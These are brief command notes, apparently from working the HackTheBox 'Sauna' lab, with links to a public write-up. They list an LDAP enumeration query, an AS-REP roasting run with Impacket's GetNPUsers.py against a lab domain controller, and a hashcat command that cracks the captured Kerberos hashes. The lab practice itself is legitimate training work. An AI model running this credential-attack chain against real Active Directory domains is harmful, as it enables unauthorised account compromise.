ldapsearch -x -h 10.129.124.191 -s base namingcontexts                                                                                                                                                                                                                                                             1 ⨯
https://0xdf.gitlab.io/2020/07/18/htb-sauna.html
python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile username.txt -outputfile hash.txt -dc-ip 10.129.124.191
https://0xdf.gitlab.io/2020/07/18/htb-sauna.html
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
